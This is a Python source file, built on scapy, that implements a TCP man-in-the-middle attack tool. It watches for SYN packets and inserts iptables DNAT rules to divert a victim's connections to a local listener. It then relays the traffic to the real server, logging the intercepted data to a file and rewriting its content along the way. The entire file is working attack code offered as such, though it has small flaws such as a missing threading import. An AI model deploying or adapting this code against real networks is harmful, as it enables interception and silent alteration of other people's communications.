from scapy.all import *
from subprocess import call

# TCP Flags
SYN = 0x02
ACK = 0x10

DATA_MESSAGE_END = b'\x1C\x0D'
DATA_TRANSMIT_END = 'ACK'

import socket
import fcntl
import struct

class tcp_MITM:
    def __init__(self, interface):
        self.interface = interface
        self.IP = self.get_ip_address(interface)
        self.pipe_dict = {}

    def get_ip_address(self, ifname):
        """
        Gets the ip_address of a specified interface by name
        :param ifname: the name of the interface
        :return: the ip address
        """
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(fcntl.ioctl(
            s.fileno(),
            0x8915,  # SIOCGIFADDR
            struct.pack('256s', ifname[:15])
        )[20:24])

    def init_mitm_pipe(self, server_port, server_ip):
        """
        Initializes a server to listen on a specified port and send the data to an actual server on another IP,
        performing MITM attack, by piping data between the two hosts
        :param server_port: the port to listen on / send to
        :param server_ip: the actual destination server IP to send to
        :return: None
        """
        listen_sock = self.start_server_listen(server_port)
        while True:
            connection, client_address = listen_sock.accept()
            print("Connection accepted on port %s" % server_port)
            send_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_address = (server_ip, server_port)
            try:
                send_sock.connect(server_address)
                print("Connected to server %s:%s" % (server_ip, server_port))
            except:
                connection.close()
                continue
            try:
                self.pipe_data(connection, send_sock)
            finally:
                print("Pipe Done")
                connection.close()
                send_sock.close()

    def pipe_data(self, connection_a, connection_b):
        """
        Pipes data back and forth between connection a and connection b until a transmit end token is found
        :param connection_a:  the first sending connection
        :param connection_b:  the second sending connection
        :return: None
        """
        while True:
            recv_data_a = self.recv_send_data(connection_a, connection_b)
            recv_data_b = self.recv_send_data(connection_b, connection_a)
            if DATA_TRANSMIT_END in recv_data_b or DATA_TRANSMIT_END in recv_data_a:
                break

    def recv_send_data(self, connection_a, connection_b):
        """
        Recieves data from one connection until it hits a message end token, and then sends that data over the
        other connection
        :param connection_a: the connection receiving from
        :param connection_b:  the connection sending to
        :return: the recieved data
        """
        recv_data_a = b''
        temp_recv_data_a = connection_a.recv(4096)
        while DATA_MESSAGE_END not in temp_recv_data_a:
            recv_data_a += temp_recv_data_a
            temp_recv_data_a = connection_a.recv(4096)
        recv_data_a += temp_recv_data_a
        if recv_data_a:
            recv_data_a = recv_data_a.replace('Trump','Duck')
            with open('logfile.log','a') as log:
                log.write(recv_data_a)
                log.write('\n')
            connection_b.sendall(recv_data_a)
        return recv_data_a

    def start_server_listen(self, server_port):
        """
        Starts a listening tcp server on a desired port
        :param server_port: the port to listen to on the host machine
        :return: the listening socket
        """
        listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listen_address = (self.IP, server_port)
        listen_sock.bind(listen_address)
        listen_sock.listen(1)
        return listen_sock

    def setup_MITM(self, pkt):
        """
        Looks for a SYN packet to be sent along a connection, and if it finds one, sets
        up a MITM attack and binds a server to listen for connections on the source of
        the packet.
        :param pkt: a packet to check for syn
        :return: None or tcp_MITM_Pipe, depending on whether a syn was sent or not
        """
        if TCP in pkt:
            if pkt[TCP].flags & SYN and not pkt[TCP].flags & ACK:
                if pkt[IP].src not in self.pipe_dict and pkt[IP].src != self.IP:
                    self.pipe_dict[pkt[IP].src] = threading.Thread(
                        target=self.init_mitm_pipe, args=(pkt[TCP].dport, pkt[IP].dst)
                    )
                    self.pipe_dict[pkt[IP].src].daemon = True
                    self.pipe_dict[pkt[IP].src].start()
                    call(("iptables -A PREROUTING -t nat -i %s -p tcp --src %s -j DNAT --to %s:%s" %
                          (self.interface, pkt[IP].src, self.IP, pkt[TCP].dport)
                          ).split(' '))

